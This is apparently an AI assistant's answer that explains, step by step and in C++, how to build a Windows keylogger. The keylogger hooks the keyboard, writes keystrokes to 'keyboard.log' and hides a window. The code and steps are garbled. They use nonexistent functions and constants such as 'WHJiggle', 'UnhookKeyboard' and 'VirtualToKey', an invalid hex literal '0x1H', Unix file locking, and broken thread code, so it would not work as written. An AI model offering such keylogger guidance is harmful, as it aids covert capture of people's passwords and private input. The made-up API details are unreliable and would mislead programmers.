To create a keyboard hook in C++ to log keystrokes on a Windows computer, follow these steps:

### Step-by-Step Explanation:

1. **Include Necessary Headers and Libraries:**
   - Include `windows.h` for Windows API functions.
   - Include `user32.h` for keyboard and mouse functions.
   - Include `iostream` for input/output operations.

2. **Use a Class or Function for Hook Setup:**
   - Create a class `KeyboardHook` to encapsulate the hook functionality.

3. **Initialize the Hook:**
   - Use `SetWindowsHook` with `WH_KEYBOARD_LL` for a local keyboard hook.
   - Specify `WHJiggle` to detect jiggling the mouse, allowing the hook to stay active.
   - The hook function `KeyboardHookProc` will handle the keystroke events.

4. **Set Up File Logging:**
   - Open a file in append mode using `fopen` with `"keyboard.log"` as the filename.
   - Use `flock` to ensure exclusive access to the file.

5. **Loop to Capture Keystrokes:**
   - Use a while loop to process events.
   - Use `GetAsyncKeyState` to check the state of each key.
   - Determine if a key is pressed or released and record the keystroke.

6. **Handle Modifier Keys:**
   - Check for `Shift`, `Ctrl`, and `Alt` using `GetKeyState`.
   - Adjust the recorded keystroke based on these modifiers.

7. **Adjust for Special Keys:**
   - Handle special keys like `Enter`, `Backspace`, `Tab`, `Space`, and `Enter`.
   - For non-printable characters, convert them to a printable ASCII value using `VirtualToKey`.

8. **Remove the Hook:**
   - Use `UnhookKeyboard` to remove the hook when the program exits.
   - Ensure all resources are freed to prevent leaks.

9. **Error Handling:**
   - Use `try`-`catch` blocks to handle file and hook errors.
   - Check for file operations failure and handle appropriately.

10. **Run the Hook in a Separate Thread:**
    - Spawn a new thread to run the hook loop to avoid UI blocking.
    - Use `CreateThread` and `WaitForSingleObject` to manage thread execution.

11. **Testing and Usage:**
    - Compile and test the program in a safe environment.
    - Ensure the log file is generated correctly with all keystrokes.

### Code Example:

```cpp
#include <windows.h>
#include <iostream>
#include <fstream>
#include <thread>

using namespace std;

class KeyboardHook {
private:
    int hhook;
    HWND hwnd;
    FILE* file;
    const char* logfile = "keyboard.log";
    static int counter;

public:
    KeyboardHook() {
        hhook = 0;
        hwnd = 0;
        file = nullptr;
    }

    ~KeyboardHook() {
        if (file) {
            fclose(file);
            file = nullptr;
        }
        if (hhook) {
            UnhookKeyboard(hhook);
            hhook = 0;
        }
    }

    static void* HookThread(void* data) {
        return static_cast<void*>(new KeyboardHook());
    }

    void InstallHook() {
        hhook = SetWindowsHook(WHJiggle, KeyboardHookProc);
        hwnd = FindWindow(nullptr, "Some Window");
        if (!hwnd) {
            cerr << "Failed to find window." << endl;
            return;
        }
        DWORD result = 0;
        if (!GetWindowRect(hwnd, &result)) {
            cerr << "Failed to get window rectangle." << endl;
            return;
        }
        ShowWindow(hwnd, SW_RESTORE);
        ShowWindow(hwnd, SW_MINIMIZE);
        ShowWindow(hwnd, SW_HIDE);
    }

    static DWORD WINAPI KeyboardHookProc(int nCode, WPARAM wParam, LPARAM lParam) {
        if (nCode == HC_GETKEYS) {
            if (GetAsyncKeyState(0x1)) {
                unsigned int modifiers = GetKeyState(0x20);
                if (wParam != 0 && GetAsyncKeyState(0x1) && !GetAsyncKeyState(0x2) && !GetAsyncKeyState(0x4)) {
                    char key = wParam;
                    if (key == 0x1A) {
                        key = '\n';
                    } else if (key == 0x1B) {
                        key = '\r';
                    } else if (key == 0x1C) {
                        key = '\t';
                    } else if (key == 0x1E) {
                        key = ' ';
                    } else if (key == 0x1F) {
                        key = '\b';
                    } else if (key == 0x1H) {
                        key = '\e';
                    } else if (key >= 0x30 && key <= 0x5A) {
                        key += 48;
                    } else if (key >= 0x60 && key <= 0x7E) {
                        key += 32;
                    }
                    if (key >= 0x20 && key <= 0x7E) {
                        if (file) {
                            fprintf(file, "[%d] %c\n", ++counter, key);
                        }
                    }
                }
            }
        }
        return 0;
    }

    void Start() {
        if (!file) {
            file = fopen(logfile, "a+");
            if (!file) {
                cerr << "Failed to open log file." << endl;
                return;
            }
            flock(file, LOCK_EX);
        }
        thread HandleThread(0);
        thread.join();
    }

    void Stop() {
        if (hhook) {
            UnhookKeyboard(hhook);
            hhook = 0;
        }
        if (file) {
            fclose(file);
            file = nullptr;
        }
    }
};

int main() {
    try {
        KeyboardHook hook;
        hook.Start();
        while (true) {
            Sleep(100);
        }
    } catch (const exception& e) {
        cerr << "Error: " << e.what() << endl;
    }
    return 0;
}
```

